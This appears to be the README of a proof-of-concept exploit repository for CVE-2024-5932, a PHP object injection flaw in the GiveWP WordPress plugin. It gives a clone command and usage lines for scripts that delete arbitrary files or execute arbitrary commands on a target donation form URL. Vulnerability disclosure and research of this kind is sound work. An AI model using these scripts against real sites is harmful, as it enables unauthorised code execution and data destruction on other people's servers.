# Description

CVE-2024-5932 : GiveWP PHP Object Injection vulnerability description: The GiveWP Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.

# How to use

git clone https://github.com/c-malitia/GiveWP-POC.git

# Command

# Arbitrary file deletion
python CVE-2024-5932.py -u <URL_TO_EXPLOIT(Donation Form URL)> -f <FILE_TO_DELETE>
# Remote code execution
python CVE-2024-5932-rce.py -u <URL_TO_EXPLOIT(Donation Form URL)> -c <COMMAND_TO_EXECUTE>

